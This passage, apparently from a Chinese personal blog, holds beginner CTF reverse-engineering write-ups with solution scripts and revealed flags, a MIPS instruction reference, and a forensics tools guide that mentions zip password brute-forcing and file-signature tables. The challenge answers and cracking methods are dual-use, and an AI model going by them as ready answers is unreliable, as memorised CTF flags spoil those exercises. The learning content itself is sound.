src="https://img-blog.csdnimg.cn/20201222203756308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只要v3是0就行了，而它是比较v5和v9的，那我们就找到v5就行了，那追踪v5：<br><img src="https://img-blog.csdnimg.cn/20201223194828253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时我们用十六进制转字符串，就可以找到了。<br><img src="https://img-blog.csdnimg.cn/20201223194930800.png" alt="在这里插入图片描述"><br>这时我们把字符串逆过来就时flag了。</p><hr /><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>界面如下，就是个游戏吗<br><img src="https://img-blog.csdnimg.cn/20201222204749725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实只要输入从8到1就出现了flag了：<br><img src="https://img-blog.csdnimg.cn/20201222204927218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过从逆向角度上看，先找到伪代码：<br><img src="https://img-blog.csdnimg.cn/2020122220524695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到最关键的是sub_457AB4()这个函数，那进去看看：<img src="https://img-blog.csdnimg.cn/20201222205447412.png" alt="在这里插入图片描述"><br>而上面都是一些原始的字符，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>]</span><br><span class="line">b = [<span class="number">123</span>,<span class="number">32</span>,<span class="number">18</span>,<span class="number">98</span>,<span class="number">119</span>,<span class="number">108</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">80</span>,<span class="number">125</span>,<span class="number">38</span>,<span class="number">124</span>,<span class="number">111</span>,<span class="number">74</span>,<span class="number">49</span>,<span class="number">83</span>,<span class="number">108</span>,<span class="number">94</span>,<span class="number">108</span>,<span class="number">84</span>,<span class="number">6</span>,<span class="number">96</span>,<span class="number">83</span>,<span class="number">44</span>,<span class="number">121</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">123</span>,<span class="number">127</span>,<span class="number">119</span>,<span class="number">96</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">71</span>,<span class="number">92</span>,<span class="number">29</span>,<span class="number">81</span>,<span class="number">107</span>,<span class="number">90</span>,<span class="number">85</span>,<span class="number">64</span>,<span class="number">12</span>,<span class="number">43</span>,<span class="number">76</span>,<span class="number">86</span>,<span class="number">13</span>,<span class="number">114</span>,<span class="number">1</span>,<span class="number">117</span>,<span class="number">126</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">    b[i] ^= a[i]</span><br><span class="line">    b[i] ^= <span class="number">0x13</span></span><br><span class="line">    print(<span class="built_in">chr</span>(b[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就可以了</p><hr /><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>ida看看伪代码，找找有用的东西：<br><img src="https://img-blog.csdnimg.cn/20201222210406123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过分析褐色部分，发现sprintf(&amp;v8, asc_408044, v4);这一步很重要，那我们看看asc_408044这个是个什么：<br><img src="https://img-blog.csdnimg.cn/2020122221092815.png" alt="在这里插入图片描述"><br>发现了%x这个东西，说明与十六进制有关，那我们将原先发现的原始数字转换成字符串：<br><img src="https://img-blog.csdnimg.cn/20201222211059734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>是个源代码，打开看看：</p><p><img src="https://img-blog.csdnimg.cn/20201222212752892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将条件的否转成事就行了，修改一下源代码就行了：<br><img src="https://img-blog.csdnimg.cn/20201222212344983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>key如下：<br><img src="https://img-blog.csdnimg.cn/20201222212458857.png" alt="在这里插入图片描述"><br>做到这新手题一半就做完了，前面都是一些小意思了，我们需要整理一下，看看到这我们是否总结出一套我们做逆向的套路呢？</p><hr /><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p>看下题目，来分析一下我们所得到的信息（我们要有这种一步一步分析的思维，但又不完全同于逻辑思维）<br><img src="https://img-blog.csdnimg.cn/20201223124516757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>它说了一个加壳了，那我们就看看到底加了什么壳（用到了一个检查壳的工具Exeinfo Pe）：<br><img src="https://img-blog.csdnimg.cn/20201223124800925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>既然知道了是upx的壳，elf文件，此时我们就要打开kali虚拟机，<img src="https://img-blog.csdnimg.cn/2020122312545045.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就去了壳，再用ida打开：（汇编界面，或着字符串界面都能找到flag）<img src="https://img-blog.csdnimg.cn/20201223125929322.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201223125819455.png" alt="在这里插入图片描述"><br>这样这道题就完成了。</p><hr /><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p>后面的题我大都在图上标出了一些做题要考虑的地方。<br>源代码如下：(源代码寻找就不说明了，因为太简单了)<br><img src="https://img-blog.csdnimg.cn/20201222213319536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现关键的一步：<br>if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )<br>其它都判断都是说Incorrect password!（输入错了）<br>而if的意思就是s的每8位对应v8的一位异或。到这就可以编脚本了：<br><img src="https://img-blog.csdnimg.cn/20201222214328741.png" alt="在这里插入图片描述"><br>这样答案就出来了（小细节应该都懂吧！）</p><hr /><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><p>如图：（那我们就想办法让它运行起来）<br><img src="https://img-blog.csdnimg.cn/20201222214655464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其它人的题解（wp）一般用的动态调试（gdb），以前做的时候没有用动态调试，而是静态调试，外加个脚本出来的。<br>动态调试（gdb）<br><img src="https://img-blog.csdnimg.cn/20201223184649483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先载入文件，辅以ida查看伪代码，发现关键函数：<br><img src="https://img-blog.csdnimg.cn/20201223185606256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们就去查看一下运行到decrypt这里是内存里储存的值（用gdb查看）<br><img src="https://img-blog.csdnimg.cn/20201223184846458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>静态调试：<br>从这里直接找到主函数<br><img src="https://img-blog.csdnimg.cn/20201223185054596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从主函数有好几个函数，我们就需要一个一个看看：<br><img src="https://img-blog.csdnimg.cn/2020122318521143.png" alt="在这里插入图片描述"><br>找到了authenticate()这个函数是关键的，而里面又发现了重要的函数，发现重要的函数：<br><img src="https://img-blog.csdnimg.cn/20201223185503379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>decrypt函数如下：<img src="https://img-blog.csdnimg.cn/20201223190304744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>追踪一下s和a2的值，（Shift+e用于提取数据，会用到这个，方便一点）<br>那我们就可以上脚本了：<br><img src="https://img-blog.csdnimg.cn/20201223193818967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实它这个就好像维吉尼亚加密似的，有一串密钥（轮换加密）</p><hr /><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p>如图，我们先找到字符串，发现了一些我们想要得到的东西，追踪一下:<br><img src="https://img-blog.csdnimg.cn/20201223102641493.png" alt="在这里插入图片描述"><br>找到伪代码：<br><img src="https://img-blog.csdnimg.cn/20201223104250291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看上面的伪代码，发现判断加密的一些东西，这么一大堆加密的，我们就要找到他们分别负责什么！实际上只有while里面的东西是我们要用到的，但我们考虑的时候（有时候我们要全盘考虑，在这之中要找到我们想要的一些条件）可以看到 strcpy(filename, “/tmp/flag.txt”) 这句，说明flag就在filename这里，下面又打印出filename它了，那我们就可疑判断在这之上的便是我们要找的加密了。<br>那我们分别找一下这些可疑的数据：</p><p><img src="https://img-blog.csdnimg.cn/20201223104540557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反复查看伪代码（其实是它这里反编译有点错误，毕竟是伪代码，不是真正的源代码），将53h转成字符为S，那下面的可疑字符串应该也是t的值。那就上脚本了：<br><img src="https://img-blog.csdnimg.cn/20201223111641675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><p>下载打开运行一下：<br><img src="https://img-blog.csdnimg.cn/20201223133211223.png" alt="在这里插入图片描述"><br>用ida打开如下：<img src="https://img-blog.csdnimg.cn/20201223134510973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们用OD（或xdbg）打开看看（用字符串搜索定位）：<br><img src="https://img-blog.csdnimg.cn/20201223140158797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后修改代码运行即可：<br><img src="https://img-blog.csdnimg.cn/20201223135921241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时flag不就出来了！（小意思了）</p><hr /><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>一道有趣的迷宫题（有意思），还是常规操作，用ida打开：<br><img src="https://img-blog.csdnimg.cn/20201223113410510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到伪代码，发现：<br><img src="https://img-blog.csdnimg.cn/20201223114215319.png" alt="在这里插入图片描述"><br>再找找成功的条件：<br><img src="https://img-blog.csdnimg.cn/20201223114348877.png" alt="在这里插入图片描述"><br>分别找找这些数据对应着什么，这样我们就有了些数据（不至于像闷头苍蝇一样）<br><img src="https://img-blog.csdnimg.cn/20201223114722229.png" alt="在这里插入图片描述"><br>总结下现有的数据：flag有24位，开头是nctf{，结尾是}，还有个一串<em>号。<br>这样我们就有了一些原始的一些数据，再看看判断条件：<br><img src="https://img-blog.csdnimg.cn/20201223115253925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整理一下我们得到的信息，我们可以大胆猜测，那串</em>号就是地图，而这四个判断就是上下左右了，再回过来看看，发现，这四个判断都会经过LABEL_15这里：<br><img src="https://img-blog.csdnimg.cn/20201223131152907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进去看看sub_400690这个函数：<img src="https://img-blog.csdnimg.cn/2020122313150388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可知地图位8*8的地图，用python打印出地图：<br><img src="https://img-blog.csdnimg.cn/20201223131905838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那我们按照地图行走就是flag了，并且按照前面的信息可以判断出’O’,’o’表示左右，’.’,’0’表示上下。而迷宫要要走到‘#’,找到路径为“右下右右下下左下下下右右右右上上左左”<br>这样flag就得到了：nctf{oo0oo00O000oooo..OO}</p><hr /><h4 id="博客"><a href="#博客" class="headerlink" title="博客"></a><a href="http://www.njhlove.club/">博客</a></h4><p>最后：望诸君共勉！</p><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26305527&auto=1&height=66"></iframe> </div><!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MIPS指令</title>
      <link href="posts/7fa8b4a9/"/>
      <url>posts/7fa8b4a9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>因为recerse有的题需要，所以整理了一下MIPS指令。<br>MIPS是在ida中无法反编译的，所以我整理下MIPS指令，这样以后就方便许多了。<br>不过MIPS还是可以反编译的，需要安装个ida的插件retdec，并解压到IDA插件目录（X:\IDA_Pro_v7.0\plugins）里。<br>这就行了！！！</p><p>指令实例：</p><ol><li><p>load/store<br>la $t0, val_1 复制val_1表示的地址到t0寄存器中    　　注： val_1是个Label<br>　lw $t2, ($t0) t0寄存器中的值作为地址，把这个地址起始的Word 复制到t2 中<br>　lw $t2, 4($t0) t0寄存器中的值作为地址， 把这个地址再加上偏移量4后 所起始的Word 复制到t2 中<br>　sw $t2, ($t0) 把t2寄存器中值（1 Word），存储到t0的值所指向的RAM中<br>　sw $t2, -12($t0) 把t2寄存器中值（1 Word），存储到t0的值再减去偏移量12, 所指向的RAM 中</p></li><li><p>算数运算指令<br>　　算数运算指令的所有操作数都是寄存器，不能直接使用RAM地址或间接寻址。<br>　　操作数的大小都为 Word （4-Byte）<br>　　指令格式与实例 注释<br>　　move $t5, $t1            // $t5 = $t1;<br>　　add $t0, $t1,            // $t2 $t0 = $t1 + $t2; 带符号数相加<br>　　sub $t0, $t1,        // $t2 $t0 = $t1 - $t2; 带符号数相减<br>　　addi $t0, $t1, 5      // $t0 = $t1 + 5;<br>　　addu $t0, $t1, $t2  // $t0 = $t1 + $t2; 无符号数相加<br>　　subu $t0, $t1, $t2  // $t0 = $t1 - $t2; 无符号数相减<br>　　mult $t3, $t4            // $t3 * $t4, 把64-Bits 的积，存储到Lo，Hi中。即： (Hi, Lo) = $t3 * $t4;<br>　　div $t5, $t6              // Lo = $t5 / $t6 (Lo为商的整数部分);　Hi = $t5 mod $t6 (Hi为余数)<br>　　mfhi $t0                      // $t0 = Hi<br>　　mflo $t1             // $t1 = Lo</p></li><li><p>分支跳转指令<br>　分支指令格式与实例 注释<br>　　b target 无条件的分支跳转，将跳转到target 标签处<br>　　beq $t0, $t1, target            // 如果 $t0 == $t1, 则跳转到target 标签处<br>　　blt $t0, $t1, target            // 如果 $t0 &lt; $t1,  则跳转到target 标签处<br>　　ble $t0, $t1, target            // 如果 $t0 &lt;=$t1,  则跳转到target 标签处<br>　　bgt $t0, $t1, target            // 如果 $t0 &gt; $t1,  则跳转到target 标签处<br>　　bge $t0, $t1, target            // 如果 $t0 &gt;= $t1, 则跳转到target 标签处<br>　　bne $t0, $t1, target            // 如果 $t0 != $t1, 则跳转到target 标签处</p></li><li><p>跳转指令<br>　指令格式与实例 注释<br>　　j target                  // 无条件的跳转, 将跳转到target 标签处<br>　　jr $t3                      // 跳转到t3寄存器所指向的地址处（Jump Register）</p></li><li><p>子函数调用指令<br>　指令格式与实例 注释<br>　　jal sub_routine_label 执行步骤：<br>　　a. 复制当前的PC（Program Counter）到$ra寄存器中。 因为当前的PC 值就是子函数执行完毕后的返回地址。<br>　　b. 程序跳转到子程序标签sub_routine_label处。　　<br>　　注：子函数的返回，使用 jr $ra　　<br>　　如果子函数内又调用了其他的子函数，那么$ra的值应该被保存到堆栈中。 因为$ra的值总是对应着当前执<br>   行的子函数的返回地址。</p></li></ol><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=461080452&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小工具使用1</title>
      <link href="posts/f3d708e2/"/>
      <url>posts/f3d708e2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><font color=#999AAA >！！！欢迎大佬前来观看！！！</p></font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="浅谈StegSolve-amp-ctf之图片隐写"><a href="#浅谈StegSolve-amp-ctf之图片隐写" class="headerlink" title="浅谈StegSolve&amp;ctf之图片隐写"></a>浅谈StegSolve&amp;ctf之图片隐写</h1><p><font color=#999AAA >个人感觉就题论题的话只会这一道题，如果将StegSolve的大体功能掌握的话，就能掌握许多道题，所以我将会主要介绍StegSlove这个jar包。</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><p><font color=#999AAA >小白快来看，，，</p><h2 id="1-StegSolve是什么？"><a href="#1-StegSolve是什么？" class="headerlink" title="1.StegSolve是什么？"></a>1.StegSolve是什么？</h2><p><font color=#999AAA >图像隐写工具Stegsolve是一个非常强大的图像批量处理工具，图像隐写工具Stegsolve的功能非常的多。支持使用不同方式解除图像隐写，是图像隐写的必备工具。<br>使用工具的优点是简单方便，但是缺乏扩展性，图像隐写工具Stegsolve官方版不能进行批量自动化处理。而对于自己编写的脚本，就可以方便的进行扩展。</p><h2 id="2-功能介绍-amp-题解"><a href="#2-功能介绍-amp-题解" class="headerlink" title="2.功能介绍&amp;题解"></a>2.功能介绍&amp;题解</h2><h2 id="如何使用StegSolve"><a href="#如何使用StegSolve" class="headerlink" title="如何使用StegSolve"></a>如何使用StegSolve</h2><p><font color=#999AAA >可以看到它的上方工具栏有三个按钮，分别是File和Analyse和Help.<br>Flie可以打开你想分析的图片，怎样分析就要用到Analyse这个了，<br>File Format:文件格式，这个主要是查看图片的具体信息<br>Data Extract:数据抽取，图片中隐藏数据的抽取<br>Steregram Solve:立体试图 可以左右控制偏移<br>Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看<br>Image Combiner:拼图，图片拼接</p><h3 id="2-来来看看怎么用"><a href="#2-来来看看怎么用" class="headerlink" title="2.来来看看怎么用"></a>2.来来看看怎么用</h3><p><font color=#999AAA >打开File Format这个按钮，它会显示一大堆信息，一般在开头和结尾有点隐藏的东西，如flag。再来看Data Extract这个按钮，有许多选项，将Red，Green，Blue的0都打上对勾，然后点击Preview，上面就会出现乱码哪里面可能会有隐藏的东西，（别问我怎么知道的，百度）记住它，这应该是rgb上的隐藏信息，再深的话就不知道了。<br>Stereogram Solve这个按钮就是将图片左右平移（放张图片看看就知道了）有时候这里也有flag。Frame Browser这个就是将动态图一帧一帧的看，里面或许有我们想要的东西。</p><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>一般碰到图片先看大小，说不定它里面隐藏这其它图片，或文件；这时候用kali里的binwalk查看一下，就知道了（或者用foremoet）如果有，用dd if=文件名 0f=一个新建的文件名 skip=从哪里开始 bs=1速度为1字节开始弄</p><h1 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h1><p><font color=#999AAA >这个软件是个处理音频的软件，有时候在音乐里会藏这点东西，我们就需要将它分离出来，大都藏的摩斯密码。</p><h1 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h1><p><font color=#999AAA >这个东西是一个暴力破解zip的软件，使用也不是特别复杂，破解zip的软件有很多，每个人使用的也不一样，所以这里先不过多介绍了。</p><h1 id="winhex"><a href="#winhex" class="headerlink" title="winhex"></a>winhex</h1><p><font color=#999AAA >这个东西比较重要了，是查看文件的十六进制。<br>十六进制编辑这个可以说是最重要的，这个功能也是最常用的，ctf中经常会用来查看十六进制数据和ascii码、修改文件头、修改图片IHDR等。</p><p>1.图片文件<br>JPEG (jpg/jpe/jpeg)                文件头：FFD8FF　　　　　文件尾：FF D9　　　　　　　　　　　　　　　<br>PNG (png)                        文件头：89504E47　　　　文件尾：AE 42 60 82<br>GIF (gif)                        文件头：47494638　　　　文件尾：00 3B<br>TIFF (tif)，                       文件头：49492A00        文件尾：<br>Windows Bitmap (bmp)，             文件头：424D            文件尾：<br>ico（ico)                        文件头：00 00 01 00<br>Adobe Photoshop (psd)，         文件头：38425053        文件尾：<br>2.office文件<br>MS Word/Excel (xls.or.doc)，    文件头：D0CF11E0<br>MS Access (mdb)，               文件头：5374616E64617264204A<br>WordPerfect (wpd)，             文件头：FF575043<br>Adobe Acrobat (pdf)，           文件头：255044462D312E<br>application/vnd.visio(vsd)        文件头：d0cf11e0a1b11ae1<br>Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，         文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                 文件头：2142444E<br>Rich Text Format (rtf)，        文件头：7B5C727466        </p><p>txt 文件(txt) ,         文件头：Unicode：feff     / Unicode big endian：fffe    / UTF-8：efbbbf    /ANSI编码是没有文件头的</p><p>3.压缩包文件<br>ZIP Archive (zip)，               文件头：504B0304        文件尾：50 4B<br>RAR Archive (rar)，             文件头：52617221<br>4.音频文件<br>Wave (wav)，                    文件头：57415645<br>audio(Audio),                    文件头： 4D546864,<br>audio/x-aac（aac）              文件头：fff1 / fff9</p><p>4.视频文件<br>AVI (avi)，                     文件头：41564920<br>Real Audio (ram)，              文件头：2E7261FD<br>Real Media (rm)，               文件头：2E524D46<br>MPEG (mpg)，                    文件头：000001BA<br>MPEG (mpg)，                    文件头：000001B3<br>Quicktime (mov)，               文件头：6D6F6F76<br>Windows Media (asf)，           文件头：3026B2758E66CF11<br>MIDI (mid)，                    文件头：4D546864</p><p>5.代码文件<br>XML (xml)，                     文件头：3C3F786D6C            文件尾：<br>HTML (html)，                   文件头：68746D6C3E</p><p>Quicken (qdf)，                 文件头：AC9EBD8F<br>Windows Password (pwl)，        文件头：E3828596</p><p>6.其他类型</p><p>windows证书文件(der)       文件头：30 82 03 C9<br>CAD (dwg)，                      